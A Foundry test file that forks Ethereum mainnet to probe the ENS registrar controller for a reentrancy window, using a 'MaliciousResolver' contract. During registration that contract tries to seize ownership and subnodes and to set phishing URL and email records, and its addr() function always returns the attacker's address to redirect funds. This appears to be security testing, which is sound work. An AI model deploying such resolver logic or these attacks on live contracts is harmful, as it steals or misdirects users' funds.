// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IPriceOracle {
    struct Price {
        uint256 base;
        uint256 premium;
    }
    function price(string calldata name, uint256 expires, uint256 duration) external view returns (Price calldata);
}

interface IETHRegistrarController {
    struct Registration {
        string label;
        address owner;
        uint256 duration;
        bytes32 secret;
        address resolver;
        bytes[] data;
        uint8 reverseRecord;
        bytes32 referrer;
    }
    
    function commit(bytes32 commitment) external;
    function register(Registration calldata registration) external payable;
    function makeCommitment(Registration calldata registration) external pure returns (bytes32);
    function commitments(bytes32) external view returns (uint256);
    function renew(string calldata label, uint256 duration, bytes32 referrer) external payable;
    function rentPrice(string calldata label, uint256 duration) external view returns (IPriceOracle.Price memory);
    function minCommitmentAge() external view returns (uint256);
    function maxCommitmentAge() external view returns (uint256);
}

interface IENS {
    function owner(bytes32 node) external view returns (address);
    function resolver(bytes32 node) external view returns (address);
    function setRecord(bytes32 node, address owner, address resolver, uint64 ttl) external;
    function setOwner(bytes32 node, address owner) external;
    function setSubnodeOwner(bytes32 node, bytes32 label, address owner) external returns (bytes32);
}

interface IBaseRegistrar {
    function ownerOf(uint256 tokenId) external view returns (address);
    function available(uint256 id) external view returns (bool);
    function nameExpires(uint256 id) external view returns (uint256);
    function controllers(address) external view returns (bool);
}

interface IPublicResolver {
    function setText(bytes32 node, string calldata key, string calldata value) external;
    function text(bytes32 node, string calldata key) external view returns (string memory);
    function setAddr(bytes32 node, address a) external;
    function addr(bytes32 node) external view returns (address payable);
    function multicallWithNodeCheck(bytes32 nodehash, bytes[] calldata data) external returns (bytes[] memory);
}

interface IAddrResolver {
    function addr(bytes32 node) external view returns (address payable);
}

interface INameResolver {
    function name(bytes32 node) external view returns (string memory);
    function setName(bytes32 node, string calldata name) external;
}

contract MaliciousResolver {
    IETHRegistrarController public controller;
    IENS public ens;
    IPublicResolver public publicResolver;
    bytes32 public targetNamehash;
    string public targetLabel;
    address public attacker;
    bool public reentrancyAttempted;
    uint256 public reentrancyCount;
    bool public exploitENSRecords;
    bool public exploitRenew;
    
    // Attack attempt tracking
    bool public triedReenterRegister;
    bool public triedRenew;
    bool public triedSetENSRecord;
    bool public triedSetENSOwner;
    bool public triedSetSubnode;
    bool public triedSetPublicResolverAddr;
    bool public triedSetPublicResolverText;
    bool public triedCallBaseRegistrar;
    string public lastError;
    
    // Man-in-the-middle attack: Intercept resolution, query PublicResolver, return malicious address
    mapping(bytes32 => address) public interceptedAddresses;
    mapping(bytes32 => bool) public addressIntercepted;
    
    // Implement IAddrResolver for custom address resolution
    // MAN-IN-THE-MIDDLE ATTACK:
    // 1. Query PublicResolver to get the CORRECT address (for obfuscation)
    // 2. Return MALICIOUS address to caller instead
    // Note: Can't store in view function, but can query PublicResolver
    function addr(bytes32 node) external view returns (address payable) {
        // MAN-IN-THE-MIDDLE ATTACK:
        // Query PublicResolver to get CORRECT address
        // This makes the resolver look legitimate (it queries the real resolver)
        address correctAddress = address(0);
        try publicResolver.addr(node) returns (address payable addr) {
            correctAddress = addr;
            // In a real attack, we might forward this to PublicResolver to emit events
            // This obfuscates the attack and makes debugging harder
            // But we can't do that in a view function
        } catch {
            // If PublicResolver fails, return attacker address
            return payable(attacker);
        }
        
        // Return MALICIOUS address instead of correct one
        // This is the key attack: user expects correctAddress but gets attacker
        // User sends funds to attacker thinking it's correctAddress
        return payable(attacker);
    }
    
    // Non-view function to store intercepted addresses (for tracking/debugging)
    // This would be called in a real attack scenario where we can modify state
    function storeInterceptedAddress(bytes32 node, address correctAddr) external {
        interceptedAddresses[node] = correctAddr;
        addressIntercepted[node] = true;
    }
    
    // Implement INameResolver for reverse resolution
    mapping(bytes32 => string) public reverseNames;
    
    function name(bytes32 node) external view returns (string memory) {
        // Can return any name we want for reverse resolution
        if (bytes(reverseNames[node]).length > 0) {
            return reverseNames[node];
        }
        // Default: return the target label
        return string.concat(targetLabel, ".eth");
    }
    
    function setName(bytes32 node, string calldata _name) external {
        // Store the name for this reverse node
        reverseNames[node] = _name;
    }
    
    // Implement IERC165 for interface detection
    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == 0x01ffc9a7 || // ERC165
               interfaceId == 0x3b3b57de || // IAddrResolver
               interfaceId == 0x691f3431; // INameResolver
    }
    
    constructor(
        address _controller,
        address _ens,
        address _publicResolver,
        bytes32 _targetNamehash,
        string memory _targetLabel
    ) {
        controller = IETHRegistrarController(_controller);
        ens = IENS(_ens);
        publicResolver = IPublicResolver(_publicResolver);
        targetNamehash = _targetNamehash;
        targetLabel = _targetLabel;
        attacker = msg.sender;
    }
    
    function setExploitFlags(bool _exploitENSRecords, bool _exploitRenew) public {
        exploitENSRecords = _exploitENSRecords;
        exploitRenew = _exploitRenew;
    }
    
    function setExploitENSRecords(bool _exploitENSRecords) public {
        exploitENSRecords = _exploitENSRecords;
    }
    
    function setExploitRenew(bool _exploitRenew) public {
        exploitRenew = _exploitRenew;
    }
    
    function multicallWithNodeCheck(
        bytes32 nodehash,
        bytes[] calldata data
    ) external returns (bytes[] memory) {
        reentrancyAttempted = true;
        reentrancyCount++;
        
        // The reentrancy window is open here:
        // 1. Commitment has been deleted
        // 2. Name is registered to controller address
        // 3. NFT not yet transferred to owner
        // 4. ENS owner is set to attacker
        // 5. Resolver is set to this contract
        
        console.log("\n=== MALICIOUS RESOLVER ATTACK ATTEMPTS ===");
        
        // Attack 1: Try to re-enter register() with same name
        _tryReenterRegister(nodehash);
        
        // Attack 2: Try to renew the name
        _tryRenew();
        
        // Attack 3: Try to set ENS records directly
        _trySetENSRecord(nodehash);
        
        // Attack 4: Try to change ENS owner
        _trySetENSOwner(nodehash);
        
        // Attack 5: Try to set subnodes
        _trySetSubnode(nodehash);
        
        // Attack 6: Try to use PublicResolver (if controller is trusted)
        _tryPublicResolver(nodehash);
        
        // Return empty results for each data element
        bytes[] memory results = new bytes[](data.length);
        for (uint256 i = 0; i < data.length; i++) {
            results[i] = "";
        }
        return results;
    }
    
    function _tryReenterRegister(bytes32 nodehash) internal {
        triedReenterRegister = true;
        // Try to re-enter register() - should fail because commitment is deleted
        try this._attemptReenterRegister(nodehash) {
            console.log("ERROR: Re-enter register succeeded!");
        } catch (bytes memory reason) {
            console.log("Re-enter register failed (expected)");
        }
    }
    
    function _attemptReenterRegister(bytes32 nodehash) external {
        // This would need the original registration struct, which we don't have
        // But we can try with a fake commitment
        revert("Cannot re-enter without original registration");
    }
    
    function _tryRenew() internal {
        triedRenew = true;
        try controller.renew{value: 0.01 ether}(targetLabel, 365 days, bytes32(0)) {
            console.log("ERROR: Renew succeeded during reentrancy!");
        } catch (bytes memory reason) {
            console.log("Renew failed (expected - name not in grace period)");
        }
    }
    
    function _trySetENSRecord(bytes32 nodehash) internal {
        triedSetENSRecord = true;
        // Try to set ENS record - we're not the owner (controller is owner of base node)
        try ens.setRecord(nodehash, attacker, address(this), 0) {
            console.log("ERROR: Set ENS record succeeded!");
        } catch (bytes memory reason) {
            console.log("Set ENS record failed (expected - not authorized)");
        }
    }
    
    function _trySetENSOwner(bytes32 nodehash) internal {
        triedSetENSOwner = true;
        // Try to change ENS owner - we're the owner, so this might work!
        try ens.setOwner(nodehash, attacker) {
            console.log("Set ENS owner succeeded!");
        } catch (bytes memory reason) {
            console.log("Set ENS owner failed");
        }
    }
    
    function _trySetSubnode(bytes32 nodehash) internal {
        triedSetSubnode = true;
        // Try to create a subnode - we're the owner, so this might work!
        bytes32 label = keccak256("malicious");
        try ens.setSubnodeOwner(nodehash, label, attacker) {
            console.log("Set subnode succeeded!");
        } catch (bytes memory reason) {
            console.log("Set subnode failed");
        }
    }
    
    function _tryPublicResolver(bytes32 nodehash) internal {
        // Try to use PublicResolver - msg.sender is controller, so if controller is trusted, this might work
        triedSetPublicResolverAddr = true;
        try publicResolver.setAddr(nodehash, attacker) {
            console.log("Set PublicResolver addr succeeded!");
        } catch (bytes memory reason) {
            console.log("Set PublicResolver addr failed");
        }
        
        triedSetPublicResolverText = true;
        try publicResolver.setText(nodehash, "url", "https://phishing-site.com") {
            console.log("Set PublicResolver text succeeded!");
        } catch (bytes memory reason) {
            console.log("Set PublicResolver text failed");
        }
    }
    
    function attemptRenew() external {
        controller.renew{value: 0.01 ether}(targetLabel, 365 days, bytes32(0));
    }
    
    function attemptENSRecordManipulation(bytes32 nodehash) external {
        // Try to set malicious text record
        // This will work if msg.sender (controller) is trusted
        try publicResolver.setText(nodehash, "url", "https://phishing-site.com") {
            console.log("Set malicious URL record");
        } catch {}
        
        try publicResolver.setText(nodehash, "email", "phishing@attacker.com") {
            console.log("Set malicious email record");
        } catch {}
        
        // Try to set malicious address
        try publicResolver.setAddr(nodehash, attacker) {
            console.log("Set malicious address record");
        } catch {}
    }
}

contract ReentrancyTest is Test {
    IETHRegistrarController public controller;
    IENS public ens;
    IBaseRegistrar public base;
    IPublicResolver public publicResolver;
    
    // Mainnet addresses
    address constant CONTROLLER_ADDRESS = 0x59E16fcCd424Cc24e280Be16E11Bcd56fb0CE547;
    address constant ENS_ADDRESS = 0x00000000000C2E074eC69A0dFb2997BA6C7d2e1e;
    address constant BASE_ADDRESS = 0x57f1887a8BF19b14fC0dF6Fd9B2acc9Af147eA85;
    address constant PUBLIC_RESOLVER_ADDRESS = 0xF29100983E058B709F3D539b0c765937B804AC15;
    
    MaliciousResolver public maliciousResolver;
    address public attacker;
    string public testLabel = "testreentrancy";
    bytes32 public labelhash;
    bytes32 public namehash;
    bytes32 constant ETH_NODE = 0x93cdeb708b7545dc668eb9280176169d1c33cfd8ed6f04690a0bcc88a93fc4ae;
    
    function setUp() public {
        // Fork mainnet at latest block where controller is authorized
        // ETHRegistrarController deployed at block 22764821
        // Controller must be added to base registrar before it can register names
        // Using latest block to ensure controller is authorized
        vm.createSelectFork("mainnet"); // Latest block - controller should be authorized
        
        controller = IETHRegistrarController(CONTROLLER_ADDRESS);
        ens = IENS(ENS_ADDRESS);
        base = IBaseRegistrar(BASE_ADDRESS);
        publicResolver = IPublicResolver(PUBLIC_RESOLVER_ADDRESS);
        
        attacker = address(0x1337);
        vm.deal(attacker, 100 ether);
        vm.startPrank(attacker);
        
        labelhash = keccak256(bytes(testLabel));
        namehash = keccak256(abi.encodePacked(ETH_NODE, labelhash));
        
        // Deploy malicious resolver
        maliciousResolver = new MaliciousResolver(
            CONTROLLER_ADDRESS,
            ENS_ADDRESS,
            PUBLIC_RESOLVER_ADDRESS,
            namehash,
            testLabel
        );
        
        vm.stopPrank();
    }
    
    function testReentrancyWindow() public {
        vm.startPrank(attacker);
        
        console.log("=== REENTRANCY TEST SETUP ===");
        console.log("Test label:", testLabel);
        console.log("Labelhash:");
        console.logBytes32(labelhash);
        console.log("Namehash:");
        console.logBytes32(namehash);
        console.log("Attacker:");
        console.logAddress(attacker);
        console.log("Malicious resolver:");
        console.logAddress(address(maliciousResolver));
        
        // Check if name is available
        bool available = base.available(uint256(labelhash));
        console.log("\nName available:", available);
        require(available, "Name not available");
        
        // Verify controller is authorized in base registrar
        bool isController = base.controllers(CONTROLLER_ADDRESS);
        console.log("Controller authorized:", isController);
        require(isController, "Controller not authorized in base registrar");
        
        // Create registration
        // CRITICAL: The controller only calls multicallWithNodeCheck if data.length > 0
        // This is where the reentrancy window opens - after commitment deletion,
        // after name registration to controller, but before NFT transfer to owner
        // We need data.length > 0 to trigger the resolver call
        bytes[] memory resolverData = new bytes[](1);
        resolverData[0] = ""; // Empty data - our resolver will handle it and return empty result
        
        IETHRegistrarController.Registration memory reg = IETHRegistrarController.Registration({
            label: testLabel,
            owner: attacker,
            duration: 365 days,
            secret: bytes32(0),
            resolver: address(maliciousResolver), // Use malicious resolver
            data: resolverData, // Must have length > 0 to trigger resolver call and reentrancy window
            reverseRecord: 0,
            referrer: bytes32(0)
        });
        
        // Make commitment
        bytes32 commitment = controller.makeCommitment(reg);
        console.log("\nCommitment:");
        console.logBytes32(commitment);
        
        // Commit
        controller.commit(commitment);
        console.log("Committed at timestamp:", block.timestamp);
        
        // Check commitment
        uint256 commitmentTimestamp = controller.commitments(commitment);
        console.log("Commitment timestamp:", commitmentTimestamp);
        require(commitmentTimestamp > 0, "Commitment not found");
        
        // Wait for minCommitmentAge (60 seconds on mainnet)
        vm.warp(block.timestamp + 61 seconds);
        
        // Verify commitment is still valid before registration
        commitmentTimestamp = controller.commitments(commitment);
        console.log("Commitment timestamp before register:", commitmentTimestamp);
        console.log("Current timestamp:", block.timestamp);
        console.log("Min commitment age:", controller.minCommitmentAge());
        console.log("Time since commitment:", block.timestamp - commitmentTimestamp);
        require(commitmentTimestamp > 0, "Commitment not found");
        require(block.timestamp >= commitmentTimestamp + controller.minCommitmentAge(), "Commitment too new");
        
        // Get actual price from oracle
        IPriceOracle.Price memory price = controller.rentPrice(testLabel, 365 days);
        uint256 totalPrice = price.base + price.premium;
        console.log("Base price:", price.base);
        console.log("Premium price:", price.premium);
        console.log("Total price:", totalPrice);
        
        // Enable exploit flags
        maliciousResolver.setExploitENSRecords(true);
        maliciousResolver.setExploitRenew(true);
        
        console.log("\n=== ATTEMPTING REGISTRATION WITH MALICIOUS RESOLVER ===");
        
        // Attempt registration - this should trigger reentrancy
        try controller.register{value: totalPrice}(reg) {
            console.log("Registration succeeded");
        } catch Error(string memory reason) {
            console.log("Registration failed with reason:");
            console.log(reason);
            revert(string(abi.encodePacked("Registration failed: ", reason)));
        } catch (bytes memory reason) {
            console.log("Registration failed with error:");
            console.logBytes(reason);
            revert("Registration failed - see logs above");
        }
        
        // Check results
        console.log("\n=== TEST RESULTS ===");
        console.log("Reentrancy attempted:", maliciousResolver.reentrancyAttempted());
        console.log("Reentrancy count:", maliciousResolver.reentrancyCount());
        
        // Check attack attempts
        console.log("\n=== ATTACK ATTEMPT RESULTS ===");
        console.log("Tried re-enter register:", maliciousResolver.triedReenterRegister());
        console.log("Tried renew:", maliciousResolver.triedRenew());
        console.log("Tried set ENS record:", maliciousResolver.triedSetENSRecord());
        console.log("Tried set ENS owner:", maliciousResolver.triedSetENSOwner());
        console.log("Tried set subnode:", maliciousResolver.triedSetSubnode());
        console.log("Tried set PublicResolver addr:", maliciousResolver.triedSetPublicResolverAddr());
        console.log("Tried set PublicResolver text:", maliciousResolver.triedSetPublicResolverText());
        
        // Check if name is registered
        address owner = base.ownerOf(uint256(labelhash));
        console.log("\nName owner (NFT):");
        console.logAddress(owner);
        
        // Check ENS records
        address ensOwner = ens.owner(namehash);
        address ensResolver = ens.resolver(namehash);
        console.log("ENS owner:");
        console.logAddress(ensOwner);
        console.log("ENS resolver:");
        console.logAddress(ensResolver);
        
        // Test man-in-the-middle attack
        console.log("\n=== MAN-IN-THE-MIDDLE ATTACK TEST ===");
        
        // First, check what PublicResolver returns (the CORRECT address)
        address correctAddress = address(0);
        try publicResolver.addr(namehash) returns (address payable publicAddr) {
            correctAddress = publicAddr;
            console.log("PublicResolver addr() returns (CORRECT address):");
            console.logAddress(publicAddr);
        } catch {
            console.log("PublicResolver has no address set for this name");
        }
        
        // Now query the malicious resolver (what user would get)
        address maliciousResolvedAddr = address(0);
        try IAddrResolver(address(maliciousResolver)).addr(namehash) returns (address payable resolvedAddr) {
            maliciousResolvedAddr = resolvedAddr;
            console.log("Malicious resolver addr() returns (MALICIOUS address):");
            console.logAddress(resolvedAddr);
        } catch {}
        
        // Check if attack worked
        if (maliciousResolvedAddr == attacker && correctAddress != attacker && correctAddress != address(0)) {
            console.log("ATTACK SUCCESSFUL: User gets malicious address instead of correct one!");
            console.log("User would send funds to:");
            console.logAddress(maliciousResolvedAddr);
            console.log("But intended recipient was:");
            console.logAddress(correctAddress);
        } else if (maliciousResolvedAddr == attacker) {
            console.log("ATTACK ACTIVE: Malicious resolver returns attacker address");
            console.log("If PublicResolver had an address set, funds would be redirected!");
        }
        
        try publicResolver.text(namehash, "url") returns (string memory url) {
            console.log("PublicResolver text('url') returns:", url);
        } catch {}
        
        // Test reverse resolution
        console.log("\n=== REVERSE RESOLUTION TEST ===");
        // Get reverse node for attacker's address
        // Reverse node = keccak256(ADDR_REVERSE_NODE, keccak256(hex(attacker)))
        bytes32 ADDR_REVERSE_NODE = 0x91d1777781884d03a6757a803996e38de2a42967fb37eeaca72729271025a9e2;
        bytes32 reverseNode = keccak256(abi.encodePacked(ADDR_REVERSE_NODE, keccak256(abi.encodePacked(attacker))));
        address reverseResolver = ens.resolver(reverseNode);
        console.log("Reverse node resolver:");
        console.logAddress(reverseResolver);
        
        if (reverseResolver == address(maliciousResolver)) {
            console.log("WARNING: Malicious resolver is used for reverse resolution!");
            try INameResolver(address(maliciousResolver)).name(reverseNode) returns (string memory reverseName) {
                console.log("Reverse resolution returns:", reverseName);
            } catch {}
        }
        
        vm.stopPrank();
    }
    
    function testENSRecordManipulation() public {
        vm.startPrank(attacker);
        
        // This test specifically checks if ENS record manipulation is possible
        // during the reentrancy window
        
        console.log("=== ENS RECORD MANIPULATION TEST ===");
        
        // Set up registration with PublicResolver
        IETHRegistrarController.Registration memory reg = IETHRegistrarController.Registration({
            label: testLabel,
            owner: attacker,
            duration: 365 days,
            secret: bytes32(0),
            resolver: address(publicResolver), // Use PublicResolver
            data: new bytes[](0),
            reverseRecord: 0,
            referrer: bytes32(0)
        });
        
        // Make and commit
        bytes32 commitment = controller.makeCommitment(reg);
        controller.commit(commitment);
        vm.warp(block.timestamp + 61 seconds);
        
        // Deploy a resolver that will try to manipulate records
        MaliciousResolver manipulator = new MaliciousResolver(
            CONTROLLER_ADDRESS,
            ENS_ADDRESS,
            PUBLIC_RESOLVER_ADDRESS,
            namehash,
            testLabel
        );
        manipulator.setExploitENSRecords(true);
        
        // Change resolver to manipulator
        reg.resolver = address(manipulator);
        commitment = controller.makeCommitment(reg);
        controller.commit(commitment);
        vm.warp(block.timestamp + 61 seconds);
        
        // Register
        uint256 price = 0.01 ether;
        controller.register{value: price}(reg);
        
        // Check if records were manipulated
        address ensResolver = ens.resolver(namehash);
        console.log("Final resolver:");
        console.logAddress(ensResolver);
        
        vm.stopPrank();
    }
}

